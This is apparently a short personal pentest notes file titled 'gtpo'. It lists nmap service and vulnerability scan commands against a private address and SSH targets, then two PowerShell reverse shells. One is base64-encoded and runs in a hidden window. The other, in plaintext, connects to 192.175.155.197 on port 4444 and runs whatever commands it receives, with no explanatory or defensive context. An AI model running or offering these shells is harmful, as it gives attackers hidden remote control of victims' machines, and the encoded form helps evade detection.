# gtpo

nmap -p 22,111,1002,2000,3001,5004,5060,5555,7007,8001,10243 -sV -sC --script=default,vuln,safe 192.168.1.10
nmap -p 22 -sV --script=ssh-hostkey,ssh2-enum-algos,safe <target-ip>

-sV --script="default,vuln,ssl-*,sshv1.nse,ssh-run.nse,ssh-publickey-acceptance.nse,ssh-hostkey.nse,ssh-auth-methods.nse,ssh2-enum-algos.nse" -oX /path/next_results.xml -oN /path/next_results.txt

powershell -nop -w hidden -encodedcommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAGMAbABpAGUAbgB0ACgAJwAxADkAMgAuADEANwA1AC4AMQA1ADUALgAxADkANwAnACwANAA0ADQANAApADsAJABzAD0AJABjAC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQA9ADAALgAuADYANQA1ADMANQBdAHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpAD0AJABzAC4AUgBlAGEAZAAoACQAYgAsADAAKQApAC0AbgBlACAAMAApAHsAOwAkAGQAPQAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABUAGUAdAB4AC4AQQBTAEMASQBFAG4AYwBvAGQAaQBuAGcAKQApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIALAAgADAAIABJACkAOwAkAHMAYgA9ACgAaQBlAHgAIAAkAGQAMgAmADIANQAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcgACkAOwAkAHMAYgAyAD0AJABzAGIAKwAnAFAAUwAgACcAKwAoAHAAdwBkACkALgBQAGEAdABoACsAJwA+ACAAJwA7ACQAcwBiAHQAPQBbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGddOjpBAFMAQwBJAEkALgBHAGUAdABCAGkAdABlAHMoACQAcwBiADIAKQA7ACQAcwAuAFcAcgBpAHQAZQAoACQAcwBiAHQALAAwACwAJABzAGIAdAAuAEwAZQBuAGcAdABoACkAOwAkAHMALgBGAGwAdQBzAGgAKAApAH0A

powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('192.175.155.197',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=[text.encoding]::ASCII.GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}"
